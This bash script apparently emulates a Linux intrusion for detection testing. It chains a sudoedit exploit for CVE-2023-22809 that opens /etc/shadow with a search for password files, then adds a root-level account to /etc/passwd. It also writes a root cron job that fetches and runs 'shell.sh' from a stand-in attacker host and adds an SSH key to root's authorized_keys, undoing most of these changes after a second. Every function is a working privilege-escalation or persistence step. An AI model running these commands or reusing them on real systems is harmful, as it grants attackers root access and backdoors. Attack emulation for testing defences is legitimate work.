#!/bin/bash

function CVE-2023-22809()
{
    EDITOR='vim -- /etc/shadow' sudoedit /etc/test
    sleep 1
}

function find_func() {
    find ./ -name "*pass*"
    sleep 1
}

function Illegal_users_add() {
    echo "hacker:x:0:0:Hacker:/root:/bin/bash" >> /etc/passwd
    sleep 1
    sed -i '$d' /etc/passwd
}

function illgal_cron_add() {
    echo "* * * * * root curl http://attacker.com/shell.sh | bash" > /etc/cron.d/persist
    sleep 1
    sed -i '$d' /etc/cron.d/persist
}

function sshkey_add() {
    echo "ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAr..." >> /root/.ssh/authorized_keys
    sleep 1
    sed -i '$d' /root/.ssh/authorized_keys
}

function read_filesystem_info() {
    ls -al /root
    sleep 1
}

function main() {
    CVE-2023-22809
    find_func
    Illegal_users_add
    illgal_cron_add
    sshkey_add
    read_filesystem_info
}

main
